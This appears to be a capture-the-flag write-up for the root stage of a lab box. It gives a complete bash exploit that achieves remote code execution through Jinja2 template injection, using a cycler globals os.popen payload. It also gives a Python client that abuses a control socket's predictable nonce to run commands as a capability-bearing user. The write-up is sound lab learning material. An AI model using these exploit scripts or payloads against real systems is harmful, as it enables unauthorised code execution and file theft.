### Summary

This is the root stage of the same box as `echochamber-user`. The `sentinel` daemon, reached through the `/run/sentinel/ctrl.sock` `shell` op, runs with the ambient capability `cap_dac_read_search`, which every shell it spawns inherits. That capability bypasses file read and directory search permission checks, so a `sentinel` shell can read `/root/root.txt` (a symlink to `/var/lib/warden/real/root.txt`, mode 600) directly. No root shell is needed or intended.

### Steps

1. Reach `sentinel` with the chain from `echochamber-user`: Flask SSTI in `/api/alert/preview`, command execution as `analyst`, then the `shell` op on `/run/sentinel/ctrl.sock` with the minute nonce. Both helper scripts are in the Scripts section. Confirm that the spawned shell carries the capability:
   ```sh
   B=$(base64 -w0 scripts/sentinel_shell.py)
   TARGET=10.48.183.207 ./scripts/ssti_rce.sh \
     "echo $B | base64 -d > /tmp/.ss.py; python3 /tmp/.ss.py 'id; getpcaps \$\$'"
   # uid=1003(sentinel) ...
   # <pid>: cap_dac_read_search=eip
   ```

2. Read the root flag. `/root/root.txt` points to `/var/lib/warden/real/root.txt` (`root:root`, mode 600). Normal `sentinel` DAC would deny that read, but `cap_dac_read_search` overrides the permission check:
   ```sh
   B=$(base64 -w0 scripts/sentinel_shell.py)
   TARGET=10.48.183.207 ./scripts/ssti_rce.sh \
     "echo $B | base64 -d > /tmp/.ss.py; python3 /tmp/.ss.py 'cat /root/root.txt'"
   # isfcr{REDACTED}
   ```

### Scripts

#### scripts/ssti_rce.sh

Runs a shell command as `analyst` through the preview SSTI. Usage: `TARGET=10.48.183.207 ./scripts/ssti_rce.sh 'id'`. The `TARGET` variable defaults to `10.48.183.207`.

```bash
#!/usr/bin/env bash
# SSTI RCE against the Anadyne Console /api/alert/preview endpoint.
# Jinja2 render_template_string on the "body" field runs as user analyst.
# Usage: ./ssti_rce.sh '<shell command>'
# Env: TARGET (default 10.48.183.207), creds analyst/analyst.
set -euo pipefail
TARGET="${TARGET:-10.48.183.207}"
CMD="${1:?usage: ssti_rce.sh <command>}"
CJ="$(mktemp)"; trap 'rm -f "$CJ"' EXIT

curl -s -c "$CJ" -b "$CJ" -d 'username=analyst&password=analyst' \
  "http://$TARGET/login" >/dev/null

# base64 the command to avoid quoting/escaping issues in the Jinja payload
B64=$(printf '%s' "$CMD" | base64 -w0)
PY="cycler.__init__.__globals__.os.popen('echo $B64|base64 -d|sh 2>&1').read()"
BODY=$(printf '{"title":"x","body":"{{ %s }}"}' "$PY")

curl -s -b "$CJ" -H 'Content-Type: application/json' -d "$BODY" \
  "http://$TARGET/api/alert/preview" \
  | python3 -c 'import sys,json; d=json.load(sys.stdin); print(d["html"].split("preview-body'"'"'>",1)[1].rsplit("</div>",1)[0])'
```

#### scripts/sentinel_shell.py

Runs on the target, not on the attacker machine. It computes the current minute nonce from the local clock, connects to `/run/sentinel/ctrl.sock`, and sends the `shell` op, so the command runs as `sentinel`. Deliver it through `ssti_rce.sh` as shown in step 1, then run `python3 /tmp/.ss.py '<cmd>'`.

```python
#!/usr/bin/env python3
"""Run a command as the `sentinel` user via the ctrl.sock `shell` dispatch.

Runs ON the target (needs its clock for the minute-nonce and local socket).
Delivered through the analyst SSTI RCE. The real dispatch table exposes
op=shell -> exec_shell, gated by a world-readable minute nonce.

Usage: python3 sentinel_shell.py '<shell command>'
"""
import base64, hashlib, json, socket, sys, time

SOCK = "/run/sentinel/ctrl.sock"
SALT = "sentinel-salt-v1-a3b7c2d9"

def nonce(off=0):
    t = (int(time.time()) // 60) + off
    return hashlib.sha256(f"{t}:{SALT}".encode()).hexdigest()[:16]

cmd = sys.argv[1] if len(sys.argv) > 1 else "id"
req = {"op": "shell", "nonce": nonce(0),
       "payload": base64.b64encode(cmd.encode()).decode()}

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.settimeout(10)
s.connect(SOCK)
s.sendall((json.dumps(req) + "\n").encode())
buf = b""
while b"\n" not in buf:
    ch = s.recv(4096)
    if not ch:
        break
    buf += ch
resp = json.loads(buf.split(b"\n", 1)[0])
if resp.get("ok"):
    sys.stdout.write(resp.get("stdout", ""))
    if resp.get("stderr"):
        sys.stderr.write(resp["stderr"])
else:
    print("ERROR:", resp, file=sys.stderr)
```

### Notes

- Dead ends by design ("play a different game"): root's shadow entry is `!*` (login locked, nothing to crack), and the `/usr/bin/sentinel-admin` SUID helper referenced by `suid.conf` does not exist on the box. The capability read is the intended path, not a privilege escalation to a root shell.
- The decoy root flag `isfcr{s0_cl0se_but_s0_f4r}` sits in `/var/lib/warden/decoy/root.txt`, world-readable. The warden serves it by swapping symlinks, so it is not the answer.
- The foothold details (SSTI, socket protocol, nonce) are in the `echochamber-user` write-up. The `sentinel.py` daemon source is not needed for this stage beyond the capability fact.
- The target was a volatile TryHackMe instance, so the nonce must be computed on the box.
